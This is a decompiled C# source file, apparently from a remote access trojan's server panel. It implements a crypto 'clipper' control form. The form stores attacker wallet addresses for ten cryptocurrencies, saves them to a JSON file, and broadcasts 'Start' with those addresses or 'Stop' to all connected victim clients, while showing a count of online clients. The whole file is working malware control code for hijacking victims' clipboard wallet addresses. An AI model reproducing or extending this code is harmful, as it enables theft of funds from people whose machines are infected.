using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using CustomControls.RJControls;
using MaterialSkin;
using MaterialSkin.Controls;
using Newtonsoft.Json;
using Server.Connectings;
using Server.Data;
using Server.Helper;

namespace Server.Forms
{
	// Token: 0x0200009D RID: 157
	public partial class FormClipper : FormMaterial
	{
		// Token: 0x06000440 RID: 1088 RVA: 0x0003445B File Offset: 0x0003265B
		public FormClipper()
		{
			this.InitializeComponent();
			base.FormClosing += this.Closing1;
		}

		// Token: 0x06000441 RID: 1089 RVA: 0x00034494 File Offset: 0x00032694
		private void FormProcess_Load(object sender, EventArgs e)
		{
			MaterialSkinManager.Instance.ThemeChanged += this.ChangeScheme;
			this.ChangeScheme(this);
			this.timer1.Start();
			if (File.Exists("local\\Clipper.json"))
			{
				Clipper clipper = JsonConvert.DeserializeObject<Clipper>(File.ReadAllText("local\\Clipper.json"));
				this.rjTextBox2.Texts = clipper.Btc;
				this.rjTextBox1.Texts = clipper.Eth;
				this.rjTextBox4.Texts = clipper.Stellar;
				this.rjTextBox3.Texts = clipper.Litecoin;
				this.rjTextBox6.Texts = clipper.BitcoinCash;
				this.rjTextBox5.Texts = clipper.monero;
				this.rjTextBox8.Texts = clipper.zcash;
				this.rjTextBox7.Texts = clipper.doge;
				this.rjTextBox9.Texts = clipper.dash;
				this.rjTextBox10.Texts = clipper.tron;
				this.materialSwitch2.Checked = clipper.AutoStart;
				if (clipper.AutoStart)
				{
					this.materialSwitch7.Checked = true;
					this.CryptoWallet = new string[]
					{
						string.IsNullOrEmpty(this.rjTextBox2.Texts) ? "null" : this.rjTextBox2.Texts,
						string.IsNullOrEmpty(this.rjTextBox1.Texts) ? "null" : this.rjTextBox1.Texts,
						string.IsNullOrEmpty(this.rjTextBox4.Texts) ? "null" : this.rjTextBox4.Texts,
						string.IsNullOrEmpty(this.rjTextBox3.Texts) ? "null" : this.rjTextBox3.Texts,
						string.IsNullOrEmpty(this.rjTextBox6.Texts) ? "null" : this.rjTextBox6.Texts,
						string.IsNullOrEmpty(this.rjTextBox5.Texts) ? "null" : this.rjTextBox5.Texts,
						string.IsNullOrEmpty(this.rjTextBox8.Texts) ? "null" : this.rjTextBox8.Texts,
						string.IsNullOrEmpty(this.rjTextBox7.Texts) ? "null" : this.rjTextBox7.Texts,
						string.IsNullOrEmpty(this.rjTextBox9.Texts) ? "null" : this.rjTextBox9.Texts,
						string.IsNullOrEmpty(this.rjTextBox10.Texts) ? "null" : this.rjTextBox10.Texts
					};
					this.work = true;
				}
			}
		}

		// Token: 0x06000442 RID: 1090 RVA: 0x00034758 File Offset: 0x00032958
		private void ChangeScheme(object sender)
		{
			this.rjTextBox1.BorderColor = FormMaterial.PrimaryColor;
			this.rjTextBox2.BorderColor = FormMaterial.PrimaryColor;
			this.rjTextBox3.BorderColor = FormMaterial.PrimaryColor;
			this.rjTextBox4.BorderColor = FormMaterial.PrimaryColor;
			this.rjTextBox5.BorderColor = FormMaterial.PrimaryColor;
			this.rjTextBox6.BorderColor = FormMaterial.PrimaryColor;
			this.rjTextBox7.BorderColor = FormMaterial.PrimaryColor;
			this.rjTextBox8.BorderColor = FormMaterial.PrimaryColor;
			this.rjTextBox9.BorderColor = FormMaterial.PrimaryColor;
			this.rjTextBox10.BorderColor = FormMaterial.PrimaryColor;
			this.rjButton2.BorderColor = FormMaterial.PrimaryColor;
			this.rjButton2.ForeColor = FormMaterial.PrimaryColor;
			this.GridLog.ColumnHeadersDefaultCellStyle.SelectionForeColor = FormMaterial.PrimaryColor;
			this.GridLog.ColumnHeadersDefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
			this.GridLog.DefaultCellStyle.SelectionBackColor = FormMaterial.PrimaryColor;
			this.GridLog.DefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
		}

		// Token: 0x06000443 RID: 1091 RVA: 0x0003487C File Offset: 0x00032A7C
		private void Closing1(object sender, FormClosingEventArgs e)
		{
			this.work = false;
			Clients[] array = this.clients.ToArray();
			for (int i = 0; i < array.Length; i++)
			{
				Clients client = array[i];
				Task.Run(delegate()
				{
					client.Disconnect();
				});
			}
			this.GridClients.Rows.Clear();
			this.Save();
			base.Hide();
			e.Cancel = true;
		}

		// Token: 0x06000444 RID: 1092 RVA: 0x000348EC File Offset: 0x00032AEC
		private void Save()
		{
			File.WriteAllText("local\\Clipper.json", JsonConvert.SerializeObject(new Clipper
			{
				Btc = this.rjTextBox2.Texts,
				Eth = this.rjTextBox1.Texts,
				Stellar = this.rjTextBox4.Texts,
				Litecoin = this.rjTextBox3.Texts,
				BitcoinCash = this.rjTextBox6.Texts,
				monero = this.rjTextBox5.Texts,
				zcash = this.rjTextBox8.Texts,
				doge = this.rjTextBox7.Texts,
				dash = this.rjTextBox9.Texts,
				tron = this.rjTextBox10.Texts,
				AutoStart = this.materialSwitch2.Checked
			}, Formatting.Indented));
		}

		// Token: 0x06000445 RID: 1093 RVA: 0x000349CC File Offset: 0x00032BCC
		private void materialSwitch7_CheckedChanged(object sender, EventArgs e)
		{
			if (this.materialSwitch7.Checked)
			{
				this.CryptoWallet = new string[]
				{
					string.IsNullOrEmpty(this.rjTextBox2.Texts) ? "null" : this.rjTextBox2.Texts,
					string.IsNullOrEmpty(this.rjTextBox1.Texts) ? "null" : this.rjTextBox1.Texts,
					string.IsNullOrEmpty(this.rjTextBox4.Texts) ? "null" : this.rjTextBox4.Texts,
					string.IsNullOrEmpty(this.rjTextBox3.Texts) ? "null" : this.rjTextBox3.Texts,
					string.IsNullOrEmpty(this.rjTextBox6.Texts) ? "null" : this.rjTextBox6.Texts,
					string.IsNullOrEmpty(this.rjTextBox5.Texts) ? "null" : this.rjTextBox5.Texts,
					string.IsNullOrEmpty(this.rjTextBox8.Texts) ? "null" : this.rjTextBox8.Texts,
					string.IsNullOrEmpty(this.rjTextBox7.Texts) ? "null" : this.rjTextBox7.Texts,
					string.IsNullOrEmpty(this.rjTextBox9.Texts) ? "null" : this.rjTextBox9.Texts,
					string.IsNullOrEmpty(this.rjTextBox10.Texts) ? "null" : this.rjTextBox10.Texts
				};
				string text = string.Join(",", this.CryptoWallet);
				Clients[] array = this.clients.ToArray();
				for (int i = 0; i < array.Length; i++)
				{
					array[i].Send(new object[]
					{
						"Start",
						text
					});
				}
			}
			else
			{
				Clients[] array = this.clients.ToArray();
				for (int i = 0; i < array.Length; i++)
				{
					array[i].Send(new object[]
					{
						"Stop"
					});
				}
			}
			this.Save();
		}

		// Token: 0x06000446 RID: 1094 RVA: 0x00034BFA File Offset: 0x00032DFA
		private void timer1_Tick(object sender, EventArgs e)
		{
			this.Text = string.Format("Clipper           Online [{0}]", this.clients.Count);
		}

		// Token: 0x06000447 RID: 1095 RVA: 0x00034C1C File Offset: 0x00032E1C
		private void rjButton2_Click(object sender, EventArgs e)
		{
			base.Hide();
		}

		// Token: 0x06000448 RID: 1096 RVA: 0x00034C24 File Offset: 0x00032E24
		private void materialSwitch2_CheckedChanged(object sender, EventArgs e)
		{
			this.Save();
		}

		// Token: 0x04000294 RID: 660
		public bool work;

		// Token: 0x04000295 RID: 661
		public string[] CryptoWallet = new string[0];

		// Token: 0x04000296 RID: 662
		public List<Clients> clients = new List<Clients>();
	}
}
